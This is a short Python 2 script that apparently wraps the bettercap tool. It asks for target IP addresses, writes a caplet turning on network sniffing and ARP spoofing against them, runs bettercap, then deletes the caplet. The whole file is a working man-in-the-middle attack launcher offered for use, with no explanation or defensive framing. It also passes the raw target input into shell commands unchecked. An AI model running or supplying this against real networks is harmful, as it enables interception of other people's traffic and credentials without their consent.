import os
print "\033[93m\033[1mif using multiple targets heres an example:	134.143.1.3, 134.143.1.6\033[0m\n"
h = raw_input("\033[1mTargets:\033[0m ")
os.system('echo "net.sniff on\n" >> arp.cap')
os.system('echo "set arp.spoof.targets {0}\n" >> arp.cap'.format(h))
os.system('echo "arp.spoof on\n" >> arp.cap')
print '\n\033[93m\033[1mto stop type "exit"\033[0m'
os.system("sleep 2")
os.system("bettercap -no-history -caplet arp.cap")
os.system("rm arp.cap")
